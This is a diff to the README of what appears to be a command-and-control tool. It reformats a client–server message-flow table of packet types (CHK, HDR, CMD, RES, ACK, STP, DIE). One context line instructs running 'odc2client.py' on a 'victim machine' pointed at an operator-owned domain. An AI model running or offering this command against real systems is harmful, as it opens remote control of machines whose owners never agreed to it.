@@ -13,12 +13,12 @@ On that VPC, install and run the server.
 On the victim machine, run `odc2client.py -d odc2.SomeDomainIOwn.com`
 
 ## Message Flow
-Client             Server
-CHK                NUL
-CHK                HDR<num CMD pkts>
-CON<last pkt num>  CMD<pkt num>
-HDR<num RES pkts>  ACK
-RES<pky num>       ACK<pkt num>
+`Client             Server`  
+`CHK                NUL`  
+`CHK                HDR<num CMD pkts>`  
+`CON<last pkt num>  CMD<pkt num>`  
+`HDR<num RES pkts>  ACK<num RES pkts>`  
+`RES<pkt num>       ACK<pkt num>`  
 
-STP from server ends current RES thread
-DIE from server closes client
+`STP` from server ends current `RES` thread
+`DIE` from server closes client
